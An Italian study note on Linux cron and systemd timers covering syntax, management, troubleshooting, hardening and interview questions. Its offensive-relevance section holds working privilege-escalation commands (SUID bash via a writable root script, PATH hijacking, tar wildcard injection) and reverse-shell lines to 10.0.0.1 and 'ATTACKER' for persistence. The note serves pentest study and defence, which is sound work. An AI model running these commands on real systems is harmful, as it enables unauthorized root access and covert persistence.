---
tipo: concetto
tag: [linux]
fase: 1
fonti: 3
aggiornato: 2026-06-22
stato: maturo
aliases: ["Cron e Job Pianificati"]

---

# Cron e Job Pianificati

## In breve

**Cron** è il demone di Linux responsabile dell'esecuzione automatica di comandi o script a orari programmati. I lavori pianificati si chiamano **cron job** e sono definiti in file chiamati **crontab**. Sono impiegati per backup, aggiornamenti, rotazione log, monitoraggio — ma rappresentano uno dei vettori più frequenti di [[Privilege Escalation Linux]] quando mal configurati.

---

## Meccanismo interno

Il demone `crond` (o `cron`) si avvia al boot come servizio di sistema (PID stabile, avviato da `systemd`). Ogni minuto legge tutti i crontab e, se l'orario corrisponde, lancia il comando come *sottoprocesso* con l'identità dell'utente proprietario del crontab.

Gerarchia di lettura (in ordine):
1. `/etc/crontab` — crontab di sistema, specifica anche l'utente di esecuzione
2. `/etc/cron.d/*` — file crontab aggiuntivi di sistema (stesso formato di `/etc/crontab`)
3. `/var/spool/cron/crontabs/<utente>` — crontab utente (gestiti con `crontab -e`)
4. Directory speciali: `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, `/etc/cron.monthly/`

---

## Sintassi crontab

### I cinque campi temporali

```
*  *  *  *  *  [utente]  comando
│  │  │  │  └── giorno settimana (0=Dom, 7=Dom, 1-6=Lun-Sab)
│  │  │  └───── mese (1-12)
│  │  └──────── giorno del mese (1-31)
│  └─────────── ora (0-23)
└────────────── minuto (0-59)
```

> Il campo `[utente]` è presente solo in `/etc/crontab` e `/etc/cron.d/*`, non nei crontab utente.

### Operatori speciali

| Operatore | Significato | Esempio |
|---|---|---|
| `*` | Ogni valore | `*` in ora = ogni ora |
| `,` | Lista di valori | `1,15` = il giorno 1 e 15 |
| `-` | Intervallo | `1-5` = lunedì-venerdì |
| `*/n` | Ogni n unità | `*/5` in minuti = ogni 5 min |
| `@reboot` | All'avvio del sistema | `@reboot /opt/start.sh` |
| `@hourly` | Ogni ora | equivale a `0 * * * *` |
| `@daily` | Ogni giorno | equivale a `0 0 * * *` |
| `@weekly` | Ogni settimana | equivale a `0 0 * * 0` |

### Esempi di espressioni

```
# ogni notte alle 02:30
30 2 * * *  /opt/backup.sh

# ogni 5 minuti
*/5 * * * *  /usr/bin/check.py

# ogni lunedì alle 09:00
0 9 * * 1  /usr/local/bin/weekly_report.sh

# il primo di ogni mese
0 0 1 * *  /opt/monthly_cleanup.sh

# solo nei giorni feriali alle 08:00
0 8 * * 1-5  /usr/bin/daily_task.sh

# all'avvio del sistema
@reboot  /opt/start_agent.sh
```

---

## Gestione dei crontab

### Comandi utente

```bash
crontab -l               # mostra il crontab dell'utente corrente
crontab -e               # modifica il crontab (apre $EDITOR)
crontab -r               # rimuove il crontab dell'utente (ATTENZIONE: irreversibile)
crontab -u alice -l      # mostra il crontab dell'utente alice (da root)
crontab -u alice -e      # modifica il crontab di alice (da root)
```

### Posizioni di sistema

```bash
cat /etc/crontab                    # crontab di sistema con colonna utente
ls -la /etc/cron.d/                 # directory con crontab di pacchetti/servizi
ls -la /etc/cron.daily/             # script eseguiti ogni giorno da run-parts
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
cat /var/spool/cron/crontabs/*      # crontab di tutti gli utenti (richiede root)
```

### Variabili d'ambiente nel crontab

Cron gira in un ambiente minimale (PATH limitato, nessuna variabile di shell interattiva). È buona pratica definirle esplicitamente:

```
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MAILTO=admin@example.com    # destinatario output (vuoto = nessuna mail)

0 2 * * *  root  /opt/backup.sh
```

---

## systemd Timers — alternativa moderna

I **systemd timer** sostituiscono cron su sistemi moderni e offrono maggiore flessibilità (dipendenze tra unit, log centralizzato via journald, calendario monotono).

```bash
# Struttura: due file, il .timer attiva il .service
# /etc/systemd/system/backup.timer
# /etc/systemd/system/backup.service

systemctl list-timers --all          # elenca tutti i timer attivi e prossima esecuzione
systemctl status backup.timer        # stato di un timer specifico
journalctl -u backup.service         # log dell'esecuzione
systemctl enable --now backup.timer  # abilita e avvia il timer
```

Differenza chiave: i timer possono essere attivati *dopo* un certo tempo dall'avvio (`OnBootSec`), non solo a orari fissi, e supportano `RandomizedDelaySec` per non sovraccaricare il sistema.

---

## Rilevanza offensiva

### Enumerazione in un pentest

```bash
# Controllo completo dei cron job — sia come utente normale che come root
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null
cat /etc/cron.d/* 2>/dev/null
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
cat /var/spool/cron/crontabs/* 2>/dev/null

# Script eseguiti da cron con permessi lassisti
find /etc/cron* /var/spool/cron -type f -ls 2>/dev/null
find / -name "*.sh" -user root -perm -002 2>/dev/null   # script root world-writable
```

LinPEAS ([[PEAS|LinPEAS]]) automatizza questa ricognizione nella sezione *Scheduled jobs*.

### Vettore 1 — Script world-writable

**Scenario**: `/etc/crontab` contiene:
```
* * * * *  root  /opt/backup.sh
```
Se `/opt/backup.sh` è scrivibile dall'attaccante (`-rwxrwxrwx`):

```bash
echo 'chmod u+s /bin/bash' >> /opt/backup.sh
# Aspetta 1 minuto...
bash -p    # shell con EUID=0
```

**Rilevamento**: `ls -la /opt/backup.sh` mostra permessi write per altri.

### Vettore 2 — PATH hijacking

**Scenario**: il crontab di sistema usa un percorso relativo:
```
* * * * *  root  backup.sh
```
E il PATH nel crontab include `/tmp` o una directory scrivibile prima di `/usr/bin`:

```bash
echo '#!/bin/bash\nchmod u+s /bin/bash' > /tmp/backup.sh
chmod +x /tmp/backup.sh
# Se PATH=:/tmp:/usr/bin, cron trova /tmp/backup.sh prima
```

### Vettore 3 — Wildcard injection (tar)

**Scenario**: script cron che esegue:
```bash
cd /var/backups && tar czf archive.tgz *
```
`tar` espande il `*` prima di eseguire. Un attaccante che controlla `/var/backups` può creare file con nomi che diventano argomenti di `tar`:

```bash
touch '/var/backups/--checkpoint=1'
touch '/var/backups/--checkpoint-action=exec=sh payload.sh'
echo '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > /var/backups/payload.sh
chmod +x /var/backups/payload.sh
```

### Vettore 4 — Persistenza

I cron job sono un meccanismo di **persistenza** classico post-exploitation:
```bash
# Aggiungere una reverse shell nel crontab utente
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'") | crontab -
```
Oppure, con accesso root, modificare `/etc/cron.d/malicious`.

---

## Hardening e difesa

| Misura | Dettaglio |
|---|---|
| Percorsi assoluti | Usare sempre `/usr/bin/python3` invece di `python3` negli script |
| Permessi script | `chmod 700 /opt/script.sh; chown root:root /opt/script.sh` |
| Audit dei crontab | Rivedere periodicamente tutti i file in `/etc/cron*` e `/var/spool/cron` |
| Restrizione utenti | `/etc/cron.allow` — solo gli utenti elencati possono usare `crontab -e` |
| Blocco | `/etc/cron.deny` — utenti che non possono usare cron |
| File integrity | Monitora modifiche a `/etc/crontab` e `/etc/cron.d/` con auditd o AIDE |
| systemd timers | Preferirli a cron per i servizi di sistema: migliore logging, dipendenze |

```bash
# Impedire l'uso di crontab agli utenti ordinari
echo "ALL" > /etc/cron.deny
echo "root" > /etc/cron.allow
```

---

## Troubleshooting

| Problema | Diagnosi | Soluzione |
|---|---|---|
| Job non eseguito | Controlla sintassi con `crontab -l` | Validare con un tool online come crontab.guru |
| Script funziona a mano ma non da cron | Ambiente minimale: PATH diverso | Impostare PATH esplicitamente nel crontab |
| Output non visibile | MAILTO vuota o mail non configurata | Reindirizza: `cmd >> /tmp/cron.log 2>&1` |
| Job eseguito più volte | Espressione ambigua (es. giorno mese + giorno settimana) | In crontab entrambi i campi sono OR: usare `*` nel campo indesiderato |
| Permessi negati sullo script | Script non eseguibile | `chmod +x /path/script.sh` |

---

## Domande da esame/colloquio

**Q1: Spiega la sintassi dei cinque campi di un crontab.**
Da sinistra: minuto (0-59), ora (0-23), giorno del mese (1-31), mese (1-12), giorno della settimana (0-7, domenica = 0 o 7). Un asterisco significa "ogni valore"; `*/5` ogni 5 unità; `1,15` i valori 1 e 15; `1-5` l'intervallo da 1 a 5.

**Q2: Qual è la differenza tra `/etc/crontab` e il crontab utente?**
`/etc/crontab` è il crontab di sistema con un sesto campo che specifica l'utente di esecuzione. I crontab utente (in `/var/spool/cron/crontabs/`) non hanno il campo utente: i job girano come l'utente proprietario del crontab. I file in `/etc/cron.d/` seguono il formato di sistema.

**Q3: Come si sfrutta uno script cron world-writable per privilege escalation?**
Se un cron job eseguito come root lancia `/opt/script.sh` e quel file è scrivibile da un utente normale, l'attaccante può aggiungere un comando malevolo (es. `chmod u+s /bin/bash` o una reverse shell). Al minuto successivo, cron esegue lo script come root.

**Q4: Cos'è il wildcard injection in un contesto cron?**
Se uno script cron usa `tar *` o `rm *` in una directory controllabile dall'attaccante, questi può creare file con nomi che vengono interpretati come argomenti da tar/rm. Per `tar` si usano `--checkpoint` e `--checkpoint-action` per eseguire comandi arbitrari.

**Q5: Come individui tutti i cron job attivi su un sistema in un pentest?**
Leggo `/etc/crontab`, `/etc/cron.d/*`, i crontab utente in `/var/spool/cron/crontabs/`, e le directory `/etc/cron.{hourly,daily,weekly,monthly}/`. Uso anche `systemctl list-timers` per i systemd timer. LinPEAS ([[PEAS|LinPEAS]]) centralizza questa ricognizione.

**Q6: Come differisce un systemd timer da un cron job?**
I systemd timer sono unit di systemd che attivano un `.service` corrispondente. Vantaggi: log integrato in journald, supporto per dipendenze tra unit, attivazione relativa al boot (`OnBootSec`), jitter configurabile (`RandomizedDelaySec`). Cron è più semplice per job ad-hoc ma ha logging limitato e ambiente minimale difficile da debuggare.

---

## Collegamenti

- [[Processi Linux]]
- [[Permessi Linux]]
- [[Privilege Escalation Linux]]
- [[Bash Scripting]]
- [[Variabili d'Ambiente]]
- [[PEAS|LinPEAS]]
- [[Reverse Shell e Bind Shell]]

## Fonti

- Man page crontab(5): https://man7.org/linux/man-pages/man5/crontab.5.html
- HackTricks – Cron jobs: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
- TryHackMe – Linux PrivEsc: https://tryhackme.com/room/linuxprivesc
